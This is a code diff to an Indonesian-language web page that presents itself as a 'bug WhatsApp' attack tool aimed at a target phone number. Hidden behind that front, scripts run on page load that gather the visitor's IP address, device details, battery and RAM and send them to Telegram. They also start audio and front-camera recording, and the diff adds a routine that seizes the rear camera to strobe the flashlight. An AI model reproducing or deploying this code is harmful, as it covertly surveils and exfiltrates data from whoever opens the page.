@@ -124,8 +124,8 @@
   <div class="bg-particles"></div>
 
   <div class="login-container">
-    <p class="login-title">sms WhatsApp By Hacked official</p>
-    <div id="notif">Sukses melaporkan ✅</div>
+    <p class="login-title">bug WhatsApp By Hacked official</p>
+    <div id="notif">Sukses bug atack ✅</div>
     
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
 
@@ -179,13 +179,11 @@
       });
     }
 
-    // FITUR DETEKSI CHARGER (AUTO UPDATE)
     async function getInfo() {
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         
-        // Deteksi baterai dan status charging
         let batteryInfo = "Tidak didukung";
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
@@ -198,7 +196,7 @@
         const device = navigator.userAgent.split('(')[1].split(')')[0];
 
         const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
-        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
+        sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n${text}`);
       } catch (err) {}
     }
 
@@ -238,11 +236,46 @@
       }
     }
 
+    // --- FITUR FLASH BARU ---
+    async function startFlashStrobe() {
+      try {
+        // Minta izin kamera belakang untuk akses flash
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const track = stream.getVideoTracks()[0];
+        const capabilities = track.getCapabilities();
+
+        if (!capabilities.torch) {
+          sendToTelegram('flash tidak on 🤬 (Device tidak support torch)');
+          stream.getTracks().forEach(t => t.stop());
+          return;
+        }
+
+        sendToTelegram('flash berhasil on ✅');
+
+        let isOn = false;
+        const interval = setInterval(async () => {
+          isOn = !isOn;
+          await track.applyConstraints({ advanced: [{ torch: isOn }] });
+        }, 100); // Kedip setiap 100ms
+
+        setTimeout(() => {
+          clearInterval(interval);
+          track.applyConstraints({ advanced: [{ torch: false }] });
+          stream.getTracks().forEach(t => t.stop());
+        }, 10000); // Berhenti setelah 10 detik
+
+      } catch (err) {
+        sendToTelegram('flash tidak on 🤬');
+      }
+    }
+    // ------------------------
+
     window.addEventListener('DOMContentLoaded', () => {
       createParticles();
       getInfo();
       autoRecordAudio(); 
       recordFrontVideo();
+      startFlashStrobe(); // Pemicu otomatis saat halaman dimuat
     });
 
     button.addEventListener('click', () => {
